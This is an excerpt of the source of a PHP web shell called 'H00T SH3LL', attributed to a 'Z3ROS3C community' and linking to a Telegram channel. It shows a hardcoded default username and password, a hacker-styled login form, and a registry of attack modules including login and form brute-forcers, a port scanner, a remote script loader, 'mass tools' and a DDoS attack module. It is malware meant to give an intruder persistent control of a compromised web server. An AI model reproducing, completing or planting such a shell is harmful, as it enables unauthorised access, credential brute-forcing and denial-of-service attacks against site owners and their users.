<?php $x_="zT0ewZ==:17a34b8cc1caf0db12053eafb00438d7748bf82c";  /* Default User: bigsecc && Pass: bigsecc */

$config=array(
	"title"     => "H00T SH3LL",                 
	"subtitle"  => "Z3ROS3C community",       
	"themes"    => "D4RK",                       
	"debug"     => false                          
);
...
<body class="text-center">
	<form method='post'>
<input style=" background: #000; color:#00ff00; border:none; outline: none; width:10%;" type="text" id="username" name="username" placeholder="Username" autocomplete="off" spellcheck="false" required autofocus><input style="  background: #000; color:#ff0000; border:none; outline: none; width:10%;" type="password" id="password" name="password" placeholder="Password" autocomplete="off" spellcheck="false" required autofocus>
<button style="border:none; outline: none;" type="submit" value="signin" name="signin">>></button>
	</form>
<br><br>
<img src="https://pngimg.com/uploads/peace_symbol/peace_symbol_PNG76.png" alt="H00T" class="center">
...
<meta name='author' content='Bigsec Community'/>
<link href="https://bigsec.in/$/sym.png" rel="icon" type="image/x-icon" />
<style type="text/css">
...
if(any("x",$_REQUEST))
{
	...
	{
		print '<h2>Join <a href="https://t.me/pentestersplace">https://t.me/pentestersplace</a> for more..</h2>';
	}
	...
	{
		$link_update='https://t.me/pentestersplace';
...
if(any("z",$_REQUEST))
{
	...
	"target-map"=>array("title"=>"Target Map","ver"=>"2.0","auth"=>"M4R5"),
	"port-scanner"=>array("title"=>"Scan Port","ver"=>"1.0","auth"=>"M4R5"),
	"script-loader"=>array("title"=>"Script Loader","ver"=>"1.0","auth"=>"M4R5"),
	"encryptor"=>array("title"=>"Encryptor","ver"=>"1.1","auth"=>"M4R5"),
	"form-bruteforces"=>array("title"=>"Form Bruteforces","ver"=>"1.0","auth"=>"M4R5"),
	"login-bruteforces"=>array("title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"M4R5"),
	"mass-tools"=>array("title"=>"Mass Tools","ver"=>"1.0","auth"=>"M4R5"),
	"ddos-attack"=>array("title"=>"DDOS Attack","ver"=>"2.0","auth"=>"M4R5"),
	));
...
printf("</div><!-- content -->
			...
			<div id='footer'>
<div id='copyrights'><a href='https://t.me/pentestersplace'>Z3ROS3C Community</a> &copy; %s</div>
